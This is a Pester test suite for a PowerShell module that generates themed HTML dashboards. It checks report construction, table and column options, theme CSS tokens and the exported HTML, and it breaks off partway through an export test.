#Requires -Version 7.0
<#
.SYNOPSIS  Pester 5 test suite for the DashHtml module.
.DESCRIPTION
    Covers all public functions:
      New-DhDashboard, Add-DhTable, Set-DhTableLink, Export-DhDashboard,
      Get-DhTheme, Add-DhSummary, Add-DhHtmlBlock,
      Add-DhCollapsible, Add-DhFilterCard, Add-DhBarChart,
      Add-DhAlertBanner, Add-DhPieChart, Add-DhBullet,
      Add-DhLineChart, Add-DhEventFeed, Add-DhStatusGrid,
      Add-DhTabs, Add-DhHeatmap, Add-DhTopologyMap

    Run:  Invoke-Pester .\Tests -Output Detailed
          .\Build.ps1   (runs automatically as part of the build)
#>

# ---------------------------------------------------------------------------
# Module import
# ---------------------------------------------------------------------------
BeforeAll {
    $modulePath = Join-Path $PSScriptRoot '..\DashHtml\DashHtml.psd1'
    Import-Module $modulePath -Force
}

AfterAll {
    Remove-Module DashHtml -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
# New-DhDashboard
# ---------------------------------------------------------------------------
Describe 'New-DhDashboard' {

    It 'Returns an OrderedDictionary with all required keys' {
        $r = New-DhDashboard -Title 'Test'
        # New-DhDashboard returns [ordered]@{} which is OrderedDictionary, not plain [hashtable]
        $r             | Should -BeOfType [System.Collections.Specialized.OrderedDictionary]
        $r.Title       | Should -Be 'Test'
        # Tables and Links are empty Lists at construction - piping an empty collection
        # through | unrolls to nothing, so compare directly to avoid the pipeline trap
        ($null -ne $r.Tables)        | Should -Be $true
        ($null -ne $r.Links)         | Should -Be $true
        $r.ThemeFamily | Should -Not -BeNullOrEmpty
        $r.Theme       | Should -Not -BeNullOrEmpty   # internal light CSS name
        $r.AlternateTheme | Should -Not -BeNullOrEmpty # internal dark CSS name (always set)
        $r.CssFileName | Should -Be ''                 # always empty — CSS embedded
        $r.GeneratedAt | Should -Not -BeNullOrEmpty
    }

    It 'Sets Subtitle correctly' {
        $r = New-DhDashboard -Title 'T' -Subtitle 'Sub'
        $r.Subtitle | Should -Be 'Sub'
    }

    It 'Warns when logo file does not exist' {
        { New-DhDashboard -Title 'T' -LogoPath 'C:\nonexistent_logo_xyz.jpg' -WarningAction Stop } |
            Should -Throw
    }

    It 'Embeds logo when JPG file exists' {
        $tmp = [IO.Path]::GetTempFileName() + '.jpg'
        [IO.File]::WriteAllBytes($tmp, [byte[]]@(0xFF, 0xD8, 0xFF, 0xD9))
        $r = New-DhDashboard -Title 'T' -LogoPath $tmp
        $r.LogoBase64 | Should -Not -BeNullOrEmpty
        Remove-Item $tmp -Force
    }

    It 'Defaults to Default theme family' {
        $r = New-DhDashboard -Title 'T'
        $r.ThemeFamily | Should -Be 'Default'
    }

    It 'Default family maps to DefaultLight (primary) and DefaultDark (alternate)' {
        $r = New-DhDashboard -Title 'T' -Theme Default
        $r.Theme          | Should -Be 'DefaultLight'
        $r.AlternateTheme | Should -Be 'DefaultDark'
    }

    It 'Azure family maps to AzureLight and AzureDark' {
        $r = New-DhDashboard -Title 'T' -Theme Azure
        $r.Theme          | Should -Be 'AzureLight'
        $r.AlternateTheme | Should -Be 'AzureDark'
    }

    It 'VMware family maps to VMwareLight and VMwareDark' {
        $r = New-DhDashboard -Title 'T' -Theme VMware
        $r.Theme          | Should -Be 'VMwareLight'
        $r.AlternateTheme | Should -Be 'VMwareDark'
    }

    It 'Grey family maps to GreyLight and GreyDark' {
        $r = New-DhDashboard -Title 'T' -Theme Grey
        $r.Theme          | Should -Be 'GreyLight'
        $r.AlternateTheme | Should -Be 'GreyDark'
    }

    It 'Company family maps to CompanyLight and CompanyDark' {
        $r = New-DhDashboard -Title 'T' -Theme Company
        $r.Theme          | Should -Be 'CompanyLight'
        $r.AlternateTheme | Should -Be 'CompanyDark'
    }

    It 'CssFileName is always empty string (CSS embedded in HTML)' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company')) {
            $r = New-DhDashboard -Title 'T' -Theme $family
            $r.CssFileName | Should -Be '' -Because "theme family '$family' must not produce an external CSS file"
        }
    }

    It 'NavTitle defaults to empty string when not set' {
        $r = New-DhDashboard -Title 'My Report'
        $r.NavTitle | Should -Be ''
    }

    It 'NavTitle stores custom short label' {
        $r = New-DhDashboard -Title 'Azure Infrastructure Report' -NavTitle 'Azure Infra'
        $r.NavTitle | Should -Be 'Azure Infra'
    }

    It 'NavTitle empty string suppresses nav label' {
        $r = New-DhDashboard -Title 'My Report' -NavTitle ''
        $r.NavTitle | Should -Be ''
    }

    # ---- v1.4.2 — -AutoRefresh ----------------------------------------------
    It 'AutoRefresh defaults to 0 (disabled) when not set' {
        $r = New-DhDashboard -Title 'R'
        $r.AutoRefreshSec | Should -Be 0
    }

    It 'AutoRefresh accepts plain integer seconds' {
        $r = New-DhDashboard -Title 'R' -AutoRefresh '30'
        $r.AutoRefreshSec | Should -Be 30
    }

    It 'AutoRefresh accepts the s / m / h units' {
        (New-DhDashboard -Title 'R' -AutoRefresh '45s').AutoRefreshSec | Should -Be 45
        (New-DhDashboard -Title 'R' -AutoRefresh '5m').AutoRefreshSec  | Should -Be 300
        (New-DhDashboard -Title 'R' -AutoRefresh '1h').AutoRefreshSec  | Should -Be 3600
    }

    It 'AutoRefresh throws on garbage input' {
        { New-DhDashboard -Title 'R' -AutoRefresh '5 minutes' } | Should -Throw
        { New-DhDashboard -Title 'R' -AutoRefresh 'abc' }       | Should -Throw
    }

    It 'AutoRefresh emits a meta http-equiv refresh tag in HTML' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AR_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $r = New-DhDashboard -Title 'R' -AutoRefresh '300'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-ar.html'
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '<meta http-equiv="refresh" content="300">'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'AutoRefresh omits the meta tag when not set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AR_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $r = New-DhDashboard -Title 'R'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-noar.html'
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Not -Match 'http-equiv="refresh"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTable
# ---------------------------------------------------------------------------
Describe 'Add-DhTable' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:data   = @(
            [PSCustomObject]@{ Name = 'Alpha'; Value = 1 }
            [PSCustomObject]@{ Name = 'Beta';  Value = 2 }
        )
    }

    It 'Adds a table to the report' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'Table 1' -Data $data
        $report.Tables.Count    | Should -Be 1
        $report.Tables[0].Id    | Should -Be 'tbl1'
        $report.Tables[0].Title | Should -Be 'Table 1'
    }

    It 'Auto-detects columns from PSObject' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data
        $cols = $report.Tables[0].Columns
        ($cols | Where-Object { $_.Field -eq 'Name' })  | Should -Not -BeNullOrEmpty
        ($cols | Where-Object { $_.Field -eq 'Value' }) | Should -Not -BeNullOrEmpty
    }

    It 'Auto-detects columns from hashtable data' {
        $hashData = @(@{ City = 'Rome'; Pop = 3000000 })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $hashData
        ($report.Tables[0].Columns | Where-Object { $_.Field -eq 'City' }) | Should -Not -BeNullOrEmpty
    }

    It 'Respects custom column Label' {
        $cols = @(@{ Field = 'Name'; Label = 'Item Name'; Width = '200px' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Label | Should -Be 'Item Name'
    }

    It 'Normalises data rows to OrderedDictionary' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data
        $report.Tables[0].Data[0] | Should -BeOfType [System.Collections.Specialized.OrderedDictionary]
    }

    It 'Applies Thresholds array to column definition' {
        $thresholds = @(
            @{ Max = 70; Class = 'cell-ok'   }
            @{           Class = 'cell-danger' }
        )
        $cols = @(@{ Field = 'Value'; Label = 'V'; Thresholds = $thresholds })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Thresholds.Count | Should -Be 2
        $col.Thresholds[0].Class | Should -Be 'cell-ok'
    }

    It 'Stores CellType on column definition' {
        $cols = @(@{ Field = 'Value'; Label = 'V'; CellType = 'progressbar'; ProgressMax = 200 })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.CellType    | Should -Be 'progressbar'
        $col.ProgressMax | Should -Be 200
    }

    It 'Stores Bold and Italic flags on column' {
        $cols = @(@{ Field = 'Name'; Label = 'N'; Bold = $true; Italic = $true })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Bold   | Should -Be $true
        $col.Italic | Should -Be $true
    }

    It 'Stores Font override on column' {
        $cols = @(@{ Field = 'Name'; Label = 'N'; Font = 'mono' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Font | Should -Be 'mono'
    }

    It 'Stores Charts array on table definition' {
        $charts = @(@{ Title = 'Status'; Field = 'Name'; Type = 'pie' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Charts $charts
        $report.Tables[0].Charts.Count      | Should -Be 1
        $report.Tables[0].Charts[0].Field   | Should -Be 'Name'
        $report.Tables[0].Charts[0].Type    | Should -Be 'pie'
    }

    It 'Throws on duplicate TableId' {
        Add-DhTable -Report $report -TableId 'dup' -Title 'T1' -Data $data
        { Add-DhTable -Report $report -TableId 'dup' -Title 'T2' -Data $data } |
            Should -Throw
    }

    It 'Throws on invalid TableId characters (spaces)' {
        { Add-DhTable -Report $report -TableId 'bad id!' -Title 'T' -Data $data } |
            Should -Throw
    }

    It 'Accepts MultiSelect flag' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -MultiSelect
        $report.Tables[0].MultiSelect.IsPresent | Should -Be $true
    }

    It 'Stores ExportFileName in table definition' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data `
            -ExportFileName 'my-export'
        $report.Tables[0].ExportFileName | Should -Be 'my-export'
    }

    It 'ExportFileName defaults to empty string when not set' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data
        $report.Tables[0].ExportFileName | Should -Be ''
    }

    It 'Aggregate property is stored on column definition' {
        $cols = @(@{ Field='Value'; Label='V'; Aggregate='sum' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Aggregate | Should -Be 'sum'
    }

    It 'PinFirst property is stored on column definition' {
        $cols = @(@{ Field='Name'; Label='N'; PinFirst=$true })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].PinFirst | Should -Be $true
    }

    It 'Stores PageSize correctly' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -PageSize 25
        $report.Tables[0].PageSize | Should -Be 25
    }

    # ---- Sparkline cell type (v1.4 F8) ---------------------------------------
    It 'CellType accepts sparkline; SortBy + SparklineStyle default sensibly' {
        $cols = @(@{ Field='Cpu24h'; Label='CPU 24h'; CellType='sparkline' })
        Add-DhTable -Report $report -TableId 'tbl-spark' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.CellType       | Should -Be 'sparkline'
        $col.SortBy         | Should -Be 'last'
        $col.SparklineStyle | Should -Be 'line'
    }

    It 'CellType validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='heatmap' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-ct' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SortBy validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SortBy='median' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-sb' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SparklineStyle validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SparklineStyle='wave' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-sps' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SortBy accepts all five reduction modes' {
        foreach ($mode in 'last','avg','max','min','sum') {
            $r = New-DhDashboard -Title 'T'
            $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SortBy=$mode })
            Add-DhTable -Report $r -TableId 'tbl' -Title 'T' -Data $data -Columns $cols
            $r.Tables[0].Columns[0].SortBy | Should -Be $mode
        }
    }

    It 'HTML emits array row values as JSON arrays (sparkline column)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SparkCell_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $rows = @(
                [PSCustomObject]@{ Host='srv-01'; Cpu24h=@(30,42,38,55,67,71,68,52) }
                [PSCustomObject]@{ Host='srv-02'; Cpu24h=@(10,12,15,11,13,9,8,7) }
            )
            $cols = @(
                @{ Field='Host';   Label='Host' }
                @{ Field='Cpu24h'; Label='CPU 24h'; CellType='sparkline'; SortBy='max'; SparklineStyle='area' }
            )
            Add-DhTable -Report $report -TableId 'srv' -Title 'Servers' -Data $rows -Columns $cols
            $htmlPath = Join-Path $tmpDir2 'test-spark-cell.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"cellType":"sparkline"'
            $content | Should -Match '"sortBy":"max"'
            $content | Should -Match '"sparklineStyle":"area"'
            # Array values preserved as JSON arrays (NOT stringified)
            $content | Should -Match '"Cpu24h":\[30,42,38,55,67,71,68,52\]'
            $content | Should -Match '"Cpu24h":\[10,12,15,11,13,9,8,7\]'
            # JS sparkline reducer + SPARK helper present
            $content | Should -Match 'function sparkReduce'
            $content | Should -Match "cellType\s*===\s*'sparkline'"
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Unified -Rag on columns (v1.4 F13) ----------------------------------
    It 'Column Rag converts to Thresholds + RagNoData' {
        $cols = @(
            @{ Field='Status'; Label='Status'
               Rag=@{
                   Green = @{ Max=70 }
                   Amber = @{ Min=70; Max=90 }
                   Red   = @{ Min=90 }
                   NoData = $true
               }
            }
        )
        Add-DhTable -Report $report -TableId 'tbl-rag' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Contains('Rag')          | Should -Be $false
        $col.RagNoData                | Should -Be $true
        @($col.Thresholds).Count      | Should -Be 3
        $col.Thresholds[0].Class      | Should -Be 'cell-ok'
        $col.Thresholds[2].Class      | Should -Be 'cell-danger'
    }

    It 'Column Rag wins over legacy Thresholds=' {
        $cols = @(
            @{ Field='Status'; Label='Status'
               Thresholds=@(@{ Value='Old'; Class='cell-warn' })  # should be discarded
               Rag=@{ Green=@{Max=50}; Red=@{Min=50} }
            }
        )
        Add-DhTable -Report $report -TableId 'tbl-rag-pref' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        @($col.Thresholds).Count    | Should -Be 2   # the two Rag bands, not the legacy 'Old'
        $col.Thresholds[0].Class    | Should -Be 'cell-ok'
        $col.Thresholds[1].Class    | Should -Be 'cell-danger'
    }

    It 'Column Rag emits ragNoData flag in HTML' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_RagTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $cols = @(
                @{ Field='Latency'; Label='Latency'
                   Rag=@{
                       Green=@{Max=50}; Amber=@{Min=50;Max=100}; Red=@{Min=100}; NoData=$true
                   }
                }
            )
            Add-DhTable -Report $report -TableId 'tbl-rag-html' -Title 'T' -Data $data -Columns $cols
            $htmlPath = Join-Path $tmpDir2 'test-col-rag.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"ragNoData":true'
            $content | Should -Match '"min":100,"class":"cell-danger"'
            $content | Should -Match '"max":50,"class":"cell-ok"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Set-DhTableLink
# ---------------------------------------------------------------------------
Describe 'Set-DhTableLink' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $data = @([PSCustomObject]@{ Key = 'A'; Val = 1 })
        Add-DhTable -Report $report -TableId 'master' -Title 'Master' -Data $data
        Add-DhTable -Report $report -TableId 'detail' -Title 'Detail' -Data $data
    }

    It 'Adds exactly one link' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Key'
        $report.Links.Count | Should -Be 1
    }

    It 'Records correct table IDs' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Key'
        $report.Links[0].MasterTableId | Should -Be 'master'
        $report.Links[0].DetailTableId | Should -Be 'detail'
    }

    It 'Records correct field names' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Val'
        $report.Links[0].MasterField | Should -Be 'Key'
        $report.Links[0].DetailField | Should -Be 'Val'
    }

    It 'Allows multiple links from same master' {
        $data2 = @([PSCustomObject]@{ Key = 'A' })
        Add-DhTable -Report $report -TableId 'detail2' -Title 'D2' -Data $data2
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail'  -MasterField 'Key' -DetailField 'Key'
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail2' -MasterField 'Key' -DetailField 'Key'
        $report.Links.Count | Should -Be 2
    }

    It 'Throws when master table does not exist' {
        { Set-DhTableLink -Report $report -MasterTableId 'noexist' -DetailTableId 'detail' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }

    It 'Throws when detail table does not exist' {
        { Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'noexist' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }

    It 'Throws when master and detail are the same table' {
        { Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'master' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }
}

# ---------------------------------------------------------------------------
# Get-DhTheme
# ---------------------------------------------------------------------------
Describe 'Get-DhTheme' {

    It 'Returns exactly six theme families when called without parameters' {
        $themes = Get-DhTheme
        $themes.Count | Should -Be 6
    }

    It 'Returned list includes all six family names' {
        $themes = Get-DhTheme
        ($themes | Where-Object Family -eq 'Default') | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Azure')   | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'VMware')  | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Grey')    | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Company') | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Rag')     | Should -Not -BeNullOrEmpty
    }

    It 'List entries expose LightTheme and DarkTheme internal names' {
        $themes = Get-DhTheme
        $default = $themes | Where-Object Family -eq 'Default'
        $default.LightTheme | Should -Be 'DefaultLight'
        $default.DarkTheme  | Should -Be 'DefaultDark'
    }

    It 'Returns PSCustomObject with LightCss and DarkCss for Default' {
        $result = Get-DhTheme -Name Default
        $result | Should -BeOfType [PSCustomObject]
        $result.LightCss | Should -BeOfType [string]
        $result.DarkCss  | Should -BeOfType [string]
        $result.LightCss.Length | Should -BeGreaterThan 1000
        $result.DarkCss.Length  | Should -BeGreaterThan 1000
    }

    It 'Default family LightCss has light background token' {
        $result = Get-DhTheme -Name Default
        $result.LightCss | Should -Match '#F0F4F8'
    }

    It 'Default family DarkCss has dark background token' {
        $result = Get-DhTheme -Name Default
        $result.DarkCss | Should -Match '#0b0f14'
    }

    It 'Company family has Montserrat and Crimson Glory in both variants' {
        $result = Get-DhTheme -Name Company
        $result.LightCss | Should -Match 'Montserrat'
        $result.LightCss | Should -Match '#BE0036'
        $result.DarkCss  | Should -Match 'Montserrat'
        $result.DarkCss  | Should -Match '#BE0036'
        $result.DarkCss  | Should -Match '#0E0709'
    }

    It 'All six families contain panel-mode CSS in both variants' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company','Rag')) {
            $result = Get-DhTheme -Name $family
            $result.LightCss | Should -Match 'panel-active' -Because "$family light must include panel CSS"
            $result.DarkCss  | Should -Match 'panel-active' -Because "$family dark must include panel CSS"
        }
    }

    It 'All six families contain cell threshold variables in both variants' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company','Rag')) {
            $result = Get-DhTheme -Name $family
            foreach ($css in @($result.LightCss, $result.DarkCss)) {
                $css | Should -Match '--cell-ok-fg'     -Because "$family must have cell-ok-fg"
                $css | Should -Match '--cell-warn-fg'   -Because "$family must have cell-warn-fg"
                $css | Should -Match '--cell-nodata-fg' -Because "$family must have cell-nodata-fg (v1.4)"
                $css | Should -Match '--nav-bg'         -Because "$family must have nav-bg"
                $css | Should -Match '--chart-1'        -Because "$family must have chart-1"
            }
        }
    }

    It 'Azure family has correct accent and font references' {
        $result = Get-DhTheme -Name Azure
        $result.LightCss | Should -Match '#0078D4'
        $result.LightCss | Should -Match 'Segoe UI'
        $result.DarkCss  | Should -Match '#479EF5'
    }

    It 'VMware family has VMware green and Inter font' {
        $result = Get-DhTheme -Name VMware
        $result.LightCss | Should -Match '#00B388'
        $result.LightCss | Should -Match 'Inter'
        $result.DarkCss  | Should -Match '#00C49A'
    }

    It 'Grey family has neutral grey accent in both variants' {
        $result = Get-DhTheme -Name Grey
        $result.LightCss | Should -Match '#546E7A'
        $result.DarkCss  | Should -Match '#78909C'
    }

    # ---- v1.4: Rag theme (spec §7.2 Office/Excel RAG palette) ----------------
    It 'Rag family uses the spec-exact RAG palette in the light variant' {
        $result = Get-DhTheme -Name Rag
        # Spec §7.2 GREEN
        $result.LightCss | Should -Match '#375623'
        $result.LightCss | Should -Match '#E2EFDA'
        # Spec §7.2 AMBER
        $result.LightCss | Should -Match '#7F4B00'
        $result.LightCss | Should -Match '#FFF2CC'
        # Spec §7.2 RED
        $result.LightCss | Should -Match '#9C0006'
        $result.LightCss | Should -Match '#FFDCE1'
        # Spec §7.2 GREY (no-data)
        $result.LightCss | Should -Match '#595959'
        $result.LightCss | Should -Match '#F2F2F2'
    }

    It 'Rag dark variant uses Office dark-mode RAG companions' {
        $result = Get-DhTheme -Name Rag
        $result.DarkCss | Should -Match '#A9D08E'   # green companion
        $result.DarkCss | Should -Match '#FFD966'   # amber companion
        $result.DarkCss | Should -Match '#FF7E7E'   # red companion
        $result.DarkCss | Should -Match '#A6A6A6'   # grey companion
    }

    It 'Rag theme is selectable via New-DhDashboard' {
        $report = New-DhDashboard -Title 'Rag test' -Theme Rag
        $report.Theme          | Should -Be 'RagLight'
        $report.AlternateTheme | Should -Be 'RagDark'
        $report.ThemeFamily    | Should -Be 'Rag'
    }

    It 'SaveTo writes two CSS files to the specified directory' {
        $tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('theme_test_' + [guid]::NewGuid().ToString('N'))
        Get-DhTheme -Name Default -SaveTo $tmpDir
        $lightFile = Join-Path $tmpDir 'Default-light.css'
        $darkFile  = Join-Path $tmpDir 'Default-dark.css'
        Test-Path $lightFile | Should -Be $true
        Test-Path $darkFile  | Should -Be $true
        (Get-Content $lightFile -Raw) | Should -Match '#F0F4F8'
        (Get-Content $darkFile  -Raw) | Should -Match '#0b0f14'
        Remove-Item $tmpDir -Recurse -Force
    }
}

# ---------------------------------------------------------------------------
# Export-DhDashboard
# ---------------------------------------------------------------------------
Describe 'Export-DhDashboard' {

    BeforeAll {
        $script:tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('DH_Test_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmpDir | Out-Null
    }

    AfterAll {
        if (Test-Path $script:tmpDir) { Remove-Item $script:tmpDir -Recurse -Force }
    }

    BeforeEach {
        $script:report = New-DhDashboard -Title 'Export Test' -Subtitle 'Unit test'
        $data = @(
            [PSCustomObject]@{ Host = 'esx01'; CPU = 45; Status = 'OK'   }
            [PSCustomObject]@{ Host = 'esx02'; CPU = 82; Status = 'Warn' }
        )
        Add-DhTable -Report $report -TableId 'hosts' -Title 'Hosts' -Data $data
    }

    It 'Creates the HTML file' {
        $htmlPath = Join-Path $tmpDir 'test-basic.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        Test-Path $htmlPath | Should -Be $true
    }

    It 'Embeds both CSS themes directly in the HTML (no external CSS file)' {
        $htmlPath = Join-Path $tmpDir 'test-css.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        # Both theme style blocks must be present
        $content | Should -Match 'id="theme-primary"'
        $content | Should -Match 'id="theme-alternate"'
        $content | Should -Match 'media="none"'
    }

    It 'HTML contains the section id for the table' {
        $htmlPath = Join-Path $tmpDir 'test-section.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'section-hosts'
    }

    It 'HTML contains TABLES_CONFIG with table id' {
        $htmlPath = Join-Path $tmpDir 'test-json.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'TABLES_CONFIG'
        $content | Should -Match '"id":"hosts"'
    }

    It 'HTML contains all three export buttons for the table' {
        $htmlPath = Join-Path $tmpDir 'test-export-btns.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'exp-csv-hosts'
        $content | Should -Match 'exp-xlsx-hosts'
        $content | Should -Match 'exp-pdf-hosts'
    }

    It 'HTML contains CDN script tags for XLSX and PDF' {
        $htmlPath = Join-Path $tmpDir 'test-cdn.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'xlsx.full.min.js'
        $content | Should -Match 'jspdf.umd.min.js'
        $content | Should -Match 'jspdf.plugin.autotable'
    }

    It 'HTML contains panel-mode JS (showPanel function)' {
        $htmlPath = Join-Path $tmpDir 'test-panels.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'showPanel'
    }

    It 'HTML contains nav bar markup' {
        $htmlPath = Join-Path $tmpDir 'test-nav.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'report-nav'
        $content | Should -Match 'nav-link'
        $content | Should -Match 'data-table="hosts"'
    }

    It 'HTML meta tag records the theme family' {
        $r2 = New-DhDashboard -Title 'T2' -Theme Company
        Add-DhTable -Report $r2 -TableId 'h2' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-meta-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'report-theme.*Company'
    }

    It 'Company theme embeds Montserrat CSS in the HTML' {
        $r2 = New-DhDashboard -Title 'T2' -Theme Company
        Add-DhTable -Report $r2 -TableId 'h2' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-company-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'Montserrat'
    }

    It 'Default theme embeds DefaultLight CSS (blue accent) in the HTML' {
        $r3 = New-DhDashboard -Title 'T3' -Theme Default
        Add-DhTable -Report $r3 -TableId 'h3' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-default-theme.html'
        Export-DhDashboard -Report $r3 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '#F0F4F8'
    }

    It 'Azure theme embeds Segoe UI and Azure blue in the HTML' {
        $r4 = New-DhDashboard -Title 'T4' -Theme Azure
        Add-DhTable -Report $r4 -TableId 'h4' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-azure-theme.html'
        Export-DhDashboard -Report $r4 -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'Segoe UI'
        $content | Should -Match '#0078D4'
    }

    It 'Does not overwrite existing file without -Force' {
        $htmlPath = Join-Path $tmpDir 'test-no-overwrite.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $before = (Get-Item $htmlPath).LastWriteTime
